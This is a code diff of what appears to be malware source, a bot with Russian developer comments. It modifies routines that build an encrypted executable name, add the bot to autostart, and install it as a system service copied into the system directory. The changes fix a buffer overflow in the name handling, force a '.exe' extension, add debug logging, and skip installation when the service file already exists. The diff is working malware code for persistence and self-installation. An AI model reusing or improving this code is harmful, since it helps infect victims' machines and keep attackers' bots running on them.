@@ -84,7 +84,7 @@ DWORD BotWorkPathHash = 0;
 
 
 // Шифрованное имя исполняемого файла бота
-char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE] = "\0";
+char CryptedBotExeName[MAX_CRYPTED_EXE_NAME_SIZE + 1] = {0};
 
 
 DWORD BotExeNameHash        = 0; // Хэш имени бота
@@ -635,7 +635,33 @@ PCHAR BOT::GetBotExeName()
 	{
 		PCHAR Name = UIDCrypt::CryptFileName(GetStr(EStrOriginalBotExeName).t_str(), false);
 
-		STR::Copy(Name, CryptedBotExeName, 0, STRA::Length(Name) + 1);
+		DWORD CopySize = STRA::Length(Name) + 1;
+		DWORD StartPos = 0;
+
+
+		//***********************************************************
+		//  Попался случай когда имя езе бота оказалось без
+		//  ресширения файла. Сучай встретился на тестовой машине и
+		//  однй сборке, определить кто виновник не удалось.
+		//  в данный момент сделал "заглушку бага"
+		//***********************************************************
+        const static char* Exe = ".exe";
+		const static DWORD MaxSize = MAX_CRYPTED_EXE_NAME_SIZE - 4;
+
+
+
+		if (CopySize > MaxSize)
+		{
+			// Имя файла больше массива
+			StartPos = CopySize - MaxSize;
+            CopySize -= StartPos;
+		}
+		STR::Copy(Name, CryptedBotExeName, StartPos, CopySize);
+
+		// Продолжение заглушки. Проверем наличие расширения
+		if (STRA::Pos(CryptedBotExeName, Exe) < 0)
+			m_lstrcat(CryptedBotExeName, Exe);
+
 
 		STR::Free(Name);
 
@@ -737,6 +763,8 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 	if (StrSame(FileName, BotFile.t_str(), false, 0))
 		return 0;
 
+	COREDBG("Core", "Добавляем бот в автозагрузку.");
+
     // Снимаем системные атрибуты
 	pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_NORMAL);
 
@@ -766,10 +794,12 @@ bool BOT::InstallService(const char* FileName)
 	if (!FileExistsA((PCHAR)FileName))
 		return false;
 
+	string FN = GetServiceFullExeName();
+	if (FN.IsEmpty() || File::IsExists(FN.t_str())) 
+		return false;
+
     COREDBG("BotCore", "Устанавливаем сервис бота");
 	// Копируем файл в системную директорию
-	string FN = GetServiceFullExeName();
-	if (FN.IsEmpty()) return false;
 
 	COREDBG("BotCore", "Создаём EXE бота %s", FN.t_str());
     bool Result = (BOOL)pCopyFileA(FileName, FN.t_str(), FALSE) != FALSE;
